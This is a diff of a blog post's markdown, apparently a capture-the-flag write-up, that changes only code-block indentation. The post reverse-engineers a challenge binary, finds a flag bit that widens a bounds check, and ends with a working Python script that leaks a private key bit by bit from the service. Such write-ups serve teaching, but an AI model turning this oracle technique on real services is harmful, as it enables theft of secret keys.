@@ -20,52 +20,52 @@ As I thought the challenge was cute enough, and that I would also like to write 
 Before I start walking you through my solution, here is a very simple way for you to set it up at home. You just have to download a copy of the binary [here](https://www.beyondsecurity.com/bevxcon/bevx-challenge-1), and create a fake *encryption* library that exports the `encrypt`/`decrypt` routines as well as the key material (`private_key` / `private_key_length`):
 
 ```C
-    #include <stdio.h>
-    #include <stdint.h>
-    #include <inttypes.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <inttypes.h>
 
-    uint32_t number_of_rows = 16;
-    uint32_t private_key_length = 32;
-    uint8_t private_key[32] = { 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0 };
+uint32_t number_of_rows = 16;
+uint32_t private_key_length = 32;
+uint8_t private_key[32] = { 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0 };
 
-    const uint64_t k = 0xba0bab;
+const uint64_t k = 0xba0bab;
 
-    uint64_t decrypt(uint64_t x) {
-        printf("decrypt(%" PRIx64 ") = %" PRIx64 "\n", x, x ^ k);
-        return x ^ k;
-    }
+uint64_t decrypt(uint64_t x) {
+    printf("decrypt(%" PRIx64 ") = %" PRIx64 "\n", x, x ^ k);
+    return x ^ k;
+}
 
-    uint64_t encrypt(uint64_t y) {
-        printf("encrypt(%" PRIx64 ") = %" PRIx64 "\n", y, y ^ k);
-        return y ^ k;
-    }
+uint64_t encrypt(uint64_t y) {
+    printf("encrypt(%" PRIx64 ") = %" PRIx64 "\n", y, y ^ k);
+    return y ^ k;
+}
 ```
 
 The above file can be compiled with the below command:
 
 ```bash
-    $ clang++ -shared -o lib.so -fPIC lib.cc
+$ clang++ -shared -o lib.so -fPIC lib.cc
 ```
 
 Dropping the resulting `lib.so` shared library file inside the same directory as the challenge should be enough to have it properly run. You can even hook it up to a socket via [socat](https://linux.die.net/man/1/socat) to simulate a remote server you have to attack:
 
 ```bash
-    $ socat -vvv TCP-LISTEN:31337,fork,reuseaddr EXEC:./cha1
+$ socat -vvv TCP-LISTEN:31337,fork,reuseaddr EXEC:./cha1
 ```
 
 If everything worked as advertised, you should now be able to interact with the challenge remotely and be greeted by the below menu when connected to it:
 
 ```text
-    Please choose your option:
-    0. Store Number
-    1. Get Number
-    2. Add
-    3. Subtract
-    4. Multiply
-    5. Divide
-    6. Private Key Encryption
-    7. Binary Representation
-    8. Exit
+Please choose your option:
+0. Store Number
+1. Get Number
+2. Add
+3. Subtract
+4. Multiply
+5. Divide
+6. Private Key Encryption
+7. Binary Representation
+8. Exit
 ```
 
 Off you go have fun now :)
@@ -78,10 +78,10 @@ When I start looking at a challenge I always spend time to understand a bit more
 Once base64-decoded, the binary is a 10KB (small) unprotected ELF64. The binary is PIE and imports a bunch of data / functions from a file named *lib.so* that we don't have access to. Based on the story we have been given, we can expect both the key materials and the encryption / decryption routines stored there.
 
 ```text
-    extern:0000000000202798 ; _QWORD __cdecl decrypt(unsigned __int64)
-    extern:0000000000202798                 extrn _Z7decryptm:near  ; DATA XREF: .got.plt:off_202020↑o
-    extern:00000000002027A0 ; _QWORD __cdecl encrypt(unsigned __int64)
-    extern:00000000002027A0                 extrn _Z7encryptm:near  ; DATA XREF: .got.plt:off_202028↑o
+extern:0000000000202798 ; _QWORD __cdecl decrypt(unsigned __int64)
+extern:0000000000202798                 extrn _Z7decryptm:near  ; DATA XREF: .got.plt:off_202020↑o
+extern:00000000002027A0 ; _QWORD __cdecl encrypt(unsigned __int64)
+extern:00000000002027A0                 extrn _Z7encryptm:near  ; DATA XREF: .got.plt:off_202028↑o
 ```
 
 Even though the challenge seems to use C++ and the [STL](https://en.wikipedia.org/wiki/Standard_Template_Library), the disassembled / decompiled code is very easy to read so it doesn't take a whole lot of time to understand a bit more what this thing is doing.
@@ -89,22 +89,22 @@ Even though the challenge seems to use C++ and the [STL](https://en.wikipedia.or
 According to what the menu says, it looks like a store of numbers; whatever that means. Quick reverse-engineering of the getter and setter functions we learn a bit more of what is a number. First, every number (`number_t`) being stored is encrypted when inserted into the store, and decrypted when retrieved out of the store.
 
 ```C
-    uint64_t write_number_to_store(number_t *number2write, uint64_t value, bool encrypted)
-    {
-      uint64_t encrypted_val = value;
-      if(encrypted) {
-        encrypted_val = encrypt(value);
-      }
-
-      size_t bitidx = 31LL;
-      do
-      {
-        uint8_t curr_encrypted_val = encrypted_val;
-        encrypted_val >>= 1;
-        number2write->bytes[bitidx--] = curr_encrypted_val & 1;
-      } while ( bitidx != -1 );
-      return encrypted_val;
+uint64_t write_number_to_store(number_t *number2write, uint64_t value, bool encrypted)
+{
+    uint64_t encrypted_val = value;
+    if(encrypted) {
+    encrypted_val = encrypt(value);
     }
+
+    size_t bitidx = 31LL;
+    do
+    {
+    uint8_t curr_encrypted_val = encrypted_val;
+    encrypted_val >>= 1;
+    number2write->bytes[bitidx--] = curr_encrypted_val & 1;
+    } while ( bitidx != -1 );
+    return encrypted_val;
+}
 ```
 
 Interestingly, the third argument of the function allows you to write a clear-text number into the store but it is apparently not used anywhere in the challenge.. oh well :)
@@ -112,29 +112,29 @@ Interestingly, the third argument of the function allows you to write a clear-te
 Once the numbers are encrypted, they also get *encoded* with a very simple transformation: every bit is written to a byte (0 or 1). As the numbers being stored are 32 bits integers, naturally the store needs 32 bytes per number.
 
 ```text
-    00000000 number_t        struc ; (sizeof=0x20)
-    00000000 bytes           db 32 dup(?)
-    00000020 number_t        ends
+00000000 number_t        struc ; (sizeof=0x20)
+00000000 bytes           db 32 dup(?)
+00000020 number_t        ends
 ```
 
 After looking a bit more at the other options, and with the above in mind, it is pretty straightforward to recover part of the structure that keeps the global state of the store (`state_t`). The store has a maximum capacity of 32 slots, the current size of the store is stored in the lower 5 bits (`2**5 = 32`) of some sort of status variable. At this point I started drafting the structure `state_t`:
 
 ```text
-    00000000 state_t         struc ; (sizeof=0x440, align=0x8)
-    00000000 numbers         number_t 32 dup(?)
-    00000400 pkey            dq ?
-    00000408 size            db ?
-    00000409                 db ? ; undefined
-    0000040A                 db ? ; undefined
-    0000040B                 db ? ; undefined
-    0000040C                 db ? ; undefined
-    0000040D                 db ? ; undefined
-    0000040E                 db ? ; undefined
-    0000040F                 db ? ; undefined
-    00000410 x               dw ?
-    00000412 xx              db 38 dup(?)
-    00000438 xxx             dq ?
-    00000440 state_t         ends
+00000000 state_t         struc ; (sizeof=0x440, align=0x8)
+00000000 numbers         number_t 32 dup(?)
+00000400 pkey            dq ?
+00000408 size            db ?
+00000409                 db ? ; undefined
+0000040A                 db ? ; undefined
+0000040B                 db ? ; undefined
+0000040C                 db ? ; undefined
+0000040D                 db ? ; undefined
+0000040E                 db ? ; undefined
+0000040F                 db ? ; undefined
+00000410 x               dw ?
+00000412 xx              db 38 dup(?)
+00000438 xxx             dq ?
+00000440 state_t         ends
 ```
 
 The *Private Key Encryption* function is the one that looked a bit more involved than the others. But as far as I was concerned, it was doing ""arithmetic"" on numbers that you previously had stored: one called the message and one called the key.
@@ -150,18 +150,18 @@ By looking at the store initialization code we can answer the first question. Th
 Fortunately for us there's not that much code, so auditing every command is easy enough. All the commands actually do a good job at sanitizing things at first sight. Every time the application asks for a slot index, it is bounds-checked against the store size before getting used. It even throws an *out-of-range* exception if you are trying to access an out-of-bounds slot. Here is an example with the *divide* operation (`number_store` is the global state, `NumberOfNumbers` is a mask extracting the lower 5 bits of the *size* field to compute the current size of the store):
 
 ```C
-    const uint32_t NumberOfNumbers = 0x1F;
-    case Divide:
-       arg1_row = 0LL;
-       arg2_row = 0LL;
-       result_row = 0LL;
-       std::cout << "Enter row of arg1, row of arg2 and row of result" << std::endl;
-       std::cin >> arg1_row;
-       std::cin >> arg2_row;
-       std::cin >> result_row;
-       store_size = number_store->size & NumberOfNumbers;
-       if(arg1_row >= store_size || arg2_row >= store_size || result_row >= store_size)
-         goto OutOfRange;
+const uint32_t NumberOfNumbers = 0x1F;
+case Divide:
+    arg1_row = 0LL;
+    arg2_row = 0LL;
+    result_row = 0LL;
+    std::cout << "Enter row of arg1, row of arg2 and row of result" << std::endl;
+    std::cin >> arg1_row;
+    std::cin >> arg2_row;
+    std::cin >> result_row;
+    store_size = number_store->size & NumberOfNumbers;
+    if(arg1_row >= store_size || arg2_row >= store_size || result_row >= store_size)
+        goto OutOfRange;
 ```
 
 There's a catch though. If we look closer at every instance of code that interacts with the `size` field of the store there is something a bit weird going on.
@@ -171,60 +171,60 @@ There's a catch though. If we look closer at every instance of code that interac
 In the above screenshot you can see that the highlighted cross-reference looks a bit odd as it is actually changing the size by setting the bit number three (`0b1000`). If we pull the code for this function we can see the below:
 
 ```C
-    case PrivateKeyEncryption:
-      number_store->size |= 8u;
-      msg_row = 0uLL;
-      key_row = 0uLL;
-      std::cout << "Enter row of message, row of key" << std::endl;
-      std::cin >> msg_row;
-      std::cin >> key_row;
-      store_size = number_store->size & NumberOfNumbers;
-      if(msg_row >= store_size || key_row >= store_size) {
-        number_store->size &= 0xF7u;
-        std::cout << "Row number is out of range" << std::cout;
+case PrivateKeyEncryption:
+    number_store->size |= 8u;
+    msg_row = 0uLL;
+    key_row = 0uLL;
+    std::cout << "Enter row of message, row of key" << std::endl;
+    std::cin >> msg_row;
+    std::cin >> key_row;
+    store_size = number_store->size & NumberOfNumbers;
+    if(msg_row >= store_size || key_row >= store_size) {
+    number_store->size &= 0xF7u;
+    std::cout << "Row number is out of range" << std::cout;
 ```
 
 I completely overlooked this detail at first as this bit is properly cleared out on error (with the `0xF7` mask). This bit also sounded to be used as a switch to start or stop the encryption process. I could clearly see it used in the encryption loop like in the below:
 
 ```C
-    while(number_store->size & 8) {
-      // do stuff
-      std::cout << "Continue Encryption? (y/n)" << std::endl;
-      std::cin >> continue_enc;
-      if(continue_enc == 'Y' || continue_enc == 'y') {
-        // do encryption..stuff
-      } else if(continue_enc == 'n' || continue_enc == 'N') {
-        number_store->size &= 0xF7u;
-      }
+while(number_store->size & 8) {
+    // do stuff
+    std::cout << "Continue Encryption? (y/n)" << std::endl;
+    std::cin >> continue_enc;
+    if(continue_enc == 'Y' || continue_enc == 'y') {
+    // do encryption..stuff
+    } else if(continue_enc == 'n' || continue_enc == 'N') {
+    number_store->size &= 0xF7u;
+    }
 ```
 
 The thing is, as this bit overlaps with the 5th bit of the store size, setting it also means that we can now access slots from index 0 up to slot `0x10|8=0x18`. If the previous is a bit confusing, consider the following C structure:
 
 ```C
-    union {
-        struct {
-            size_t x : 3;
-            size_t bit3 : 1;
-        } s1;
-        size_t store_size : 5;
-    } size = {};
+union {
+    struct {
+        size_t x : 3;
+        size_t bit3 : 1;
+    } s1;
+    size_t store_size : 5;
+} size = {};
 ```
 
 And as we said a bit earlier the key material is stored in the slot `number_of_rows + 2 = 0n18`.
 
 ```C
-    __int64 realmain(struct_buffer *number_store) {
-      nrows = number_of_rows;
-      pkey_length = private_key_length;
-      pkey = &number_store->numbers[number_of_rows + 2];
-      is_pkey_empty = private_key_length == 0;
-      number_store->pkey = pkey;
-      if(!is_pkey_empty) {
-        memmove(pkey, &private_key, pkey_length);
-      }
-      number_store->pkey->bytes[pkey_length - 1] |= 1u;
-      number_store->size = nrows & 0x1F | number_store->size & 0xE0;
-      // ...
+__int64 realmain(struct_buffer *number_store) {
+    nrows = number_of_rows;
+    pkey_length = private_key_length;
+    pkey = &number_store->numbers[number_of_rows + 2];
+    is_pkey_empty = private_key_length == 0;
+    number_store->pkey = pkey;
+    if(!is_pkey_empty) {
+    memmove(pkey, &private_key, pkey_length);
+    }
+    number_store->pkey->bytes[pkey_length - 1] |= 1u;
+    number_store->size = nrows & 0x1F | number_store->size & 0xE0;
+    // ...
 ```
 
 Cool beans, I guess we now have a way to have the application interact with the slot containing the private key which sounds like... progress, right? 
@@ -242,21 +242,21 @@ Being able to access the key through the *private key encryption* feature is gre
 The prettified code looks like this:
 
 ```C
-    while(number_store->size & 8) {
-      // do stuff
-      std::cout << "Continue Encryption? (y/n)" << std::endl;
-      std::cin >> continue_enc;
-      if(continue_enc == 'Y' || continue_enc == 'y') {
-        number_store->magicnumber *= number_store->magicnumber;
-        if(number_store->keycpy[idx] == 1) {
-          uint64_t msg = 0;
-          read_number_from_store(&number_store->numbers[msg_slot & 0x7F], &msg);
-          number_store->magicnumber *= msg;
-        }
-      } else if(continue_enc == 'n' || continue_enc == 'N') {
-        number_store->size &= 0xF7u;
-      }
+while(number_store->size & 8) {
+    // do stuff
+    std::cout << "Continue Encryption? (y/n)" << std::endl;
+    std::cin >> continue_enc;
+    if(continue_enc == 'Y' || continue_enc == 'y') {
+    number_store->magicnumber *= number_store->magicnumber;
+    if(number_store->keycpy[idx] == 1) {
+        uint64_t msg = 0;
+        read_number_from_store(&number_store->numbers[msg_slot & 0x7F], &msg);
+        number_store->magicnumber *= msg;
     }
+    } else if(continue_enc == 'n' || continue_enc == 'N') {
+    number_store->size &= 0xF7u;
+    }
+}
 ```
 
 As you might have figured, we have basically two avenues (technically three I guess.. but one is clearly useless :-D). Either we load the private key as the message, or we load it as the key parameter.
@@ -264,7 +264,7 @@ As you might have figured, we have basically two avenues (technically three I gu
 If we do the former - based on the encryption logic - we end up with no real control over the way the `magicnumber` is going to be computed. Keep in mind the numbers in the store are all encrypted with the `encrypt` function and when the key is retrieved out of the store, it isn't decrypted (it is not a normal *get* operation) but just `memcpy`'d to the `keycpy` field like in the below:
 
 ```C
-    memmove(number_store->keycpy, &number_store->numbers[keyslot], 32);
+memmove(number_store->keycpy, &number_store->numbers[keyslot], 32);
 ```
 
 So even if we can insert a known value in the store, we wouldn't really know what it would look like once encrypted.
@@ -296,91 +296,91 @@ Oh yeah by the way, remember this third stupid possibility I mentioned earlier? 
 Here is my ugly python implementation of the attack:
 
 ```python
-    # Axel '0vercl0k' Souchet - 3-March-2018
-    import sys
-    import socket
+# Axel '0vercl0k' Souchet - 3-March-2018
+import sys
+import socket
 
-    host = ('192.168.1.41', 31337)
+host = ('192.168.1.41', 31337)
 
-    def recv_until(c, s):
-        buff = ''
-        while True:
-            b = c.recv(1)
-            buff += b
-            if s in buff:
-                return buff
+def recv_until(c, s):
+    buff = ''
+    while True:
+        b = c.recv(1)
+        buff += b
+        if s in buff:
+            return buff
 
-        return None
+    return None
 
-    def addn(c, r_n, n):
-        recv_until(c, '8. Exit\n')
-        c.send('0\n%d\n%d\n' % (r_n, n))
+def addn(c, r_n, n):
+    recv_until(c, '8. Exit\n')
+    c.send('0\n%d\n%d\n' % (r_n, n))
 
-    def readn(c, r_n):
-        recv_until(c, '8. Exit\n')
-        c.send('1\n%d\n' % r_n)
-        recv_until(c, 'Result is ')
-        res = c.recv(1024).splitlines()
-        return int(res[0], 10)
+def readn(c, r_n):
+    recv_until(c, '8. Exit\n')
+    c.send('1\n%d\n' % r_n)
+    recv_until(c, 'Result is ')
+    res = c.recv(1024).splitlines()
+    return int(res[0], 10)
 
-    def main():
-        r_key = 18
-        r_oracle = 0
-        # first step is to find out how many 0's the key starts with,
-        # to do so we ask for an encryption where the key is the pkey,
-        # and we encrypt until we cannot and we count the number of
-        # 'Continue Encryption?'. 32 - this number should give us the
-        # number of 0s
-        n_zeros = 32
+def main():
+    r_key = 18
+    r_oracle = 0
+    # first step is to find out how many 0's the key starts with,
+    # to do so we ask for an encryption where the key is the pkey,
+    # and we encrypt until we cannot and we count the number of
+    # 'Continue Encryption?'. 32 - this number should give us the
+    # number of 0s
+    n_zeros = 32
+    c = socket.create_connection(host)
+    addn(c, r_oracle, 1337)
+    recv_until(c, '8. Exit\n')
+    c.send('6\n%d\n%d\n' % (r_oracle, r_key))
+    recv_until(c, 'Continue Encryption? (y/n)\n')
+    for _ in range(32):
+        c.send('y\n')
+        n_zeros -= 1
+        if 'Continue Encryption? (y/n)' not in c.recv(1024):
+            break
+
+    if n_zeros > 0:
+        print 'Found', n_zeros, '0s at the start of the key'
+    
+    leaked_key = [ 0 ] * n_zeros
+    v_oracle = 3
+    # now we can go ahead and leak the key bit by bit (each byte is a bit)
+    for i in range(32 - n_zeros):
+        which_bit = len(leaked_key) + 1
+        bit_idx = which_bit - n_zeros
         c = socket.create_connection(host)
-        addn(c, r_oracle, 1337)
+        addn(c, r_oracle, v_oracle)
+        # private key encryption
         recv_until(c, '8. Exit\n')
         c.send('6\n%d\n%d\n' % (r_oracle, r_key))
-        recv_until(c, 'Continue Encryption? (y/n)\n')
-        for _ in range(32):
+        for _ in range(bit_idx):
+            recv_until(c, 'Continue Encryption? (y/n)\n')
             c.send('y\n')
-            n_zeros -= 1
-            if 'Continue Encryption? (y/n)' not in c.recv(1024):
-                break
 
-        if n_zeros > 0:
-            print 'Found', n_zeros, '0s at the start of the key'
-     
-        leaked_key = [ 0 ] * n_zeros
-        v_oracle = 3
-        # now we can go ahead and leak the key bit by bit (each byte is a bit)
-        for i in range(32 - n_zeros):
-            which_bit = len(leaked_key) + 1
-            bit_idx = which_bit - n_zeros
-            c = socket.create_connection(host)
-            addn(c, r_oracle, v_oracle)
-            # private key encryption
-            recv_until(c, '8. Exit\n')
-            c.send('6\n%d\n%d\n' % (r_oracle, r_key))
-            for _ in range(bit_idx):
-                recv_until(c, 'Continue Encryption? (y/n)\n')
-                c.send('y\n')
+        if which_bit < 32:
+            recv_until(c, 'Continue Encryption? (y/n)\n')
+            c.send('n\n')
 
-            if which_bit < 32:
-                recv_until(c, 'Continue Encryption? (y/n)\n')
-                c.send('n\n')
-
-            magic_number = 1
-            for b in leaked_key[n_zeros :]:
-                magic_number &= 0xffffffff
-                magic_number *= magic_number
-                if b == 1:
-                    magic_number *= v_oracle
-
-            magic_number *= magic_number
+        magic_number = 1
+        for b in leaked_key[n_zeros :]:
             magic_number &= 0xffffffff
-            n = readn(c, r_oracle)
-            bit = 0 if magic_number == n else 1
-            leaked_key.append(bit)
-            c.close()
-            print 'Leaked key: %08x\r' % reduce(lambda x, y: (x * 2) + y, leaked_key),
+            magic_number *= magic_number
+            if b == 1:
+                magic_number *= v_oracle
 
-    main()
+        magic_number *= magic_number
+        magic_number &= 0xffffffff
+        n = readn(c, r_oracle)
+        bit = 0 if magic_number == n else 1
+        leaked_key.append(bit)
+        c.close()
+        print 'Leaked key: %08x\r' % reduce(lambda x, y: (x * 2) + y, leaked_key),
+
+main()
 ```
 
 Which should result in something like below:
